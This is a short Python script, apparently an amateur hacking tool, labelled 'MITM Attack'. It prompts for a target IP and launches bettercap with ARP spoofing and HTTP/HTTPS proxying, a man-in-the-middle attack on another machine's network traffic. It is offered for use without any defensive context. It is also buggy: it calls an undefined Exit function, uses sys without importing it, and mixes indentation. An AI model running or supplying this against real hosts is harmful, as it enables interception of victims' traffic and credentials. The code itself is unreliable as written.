#!/usr/bin/python

import os
print("===============================================================================")
os.system("figlet MITM Attack  By Dyar Sahdi")
print("===============================================================================")

import subprocess

def menu():
	print("=================")
	print("1: BetterCape")
	print("2:Quite")
	print("=================")
	menu_input=input("Select:")
	if menu_input==1:
		Bettercap()
	elif menu_input==2:
		Exit()

def Bettercap():
	os.system("clear")
	IP=raw_input("Enter IP Address:")
  	subprocess.call(['bettercap','-X','-T',IP,'arp','--proxy-http','--proxy-https'])


def Exite():
	sys.exit(0)

if __name__ == "__main__":
	try:
		menu()

	except KeyboardInterrupt:
		sys.exit(0)


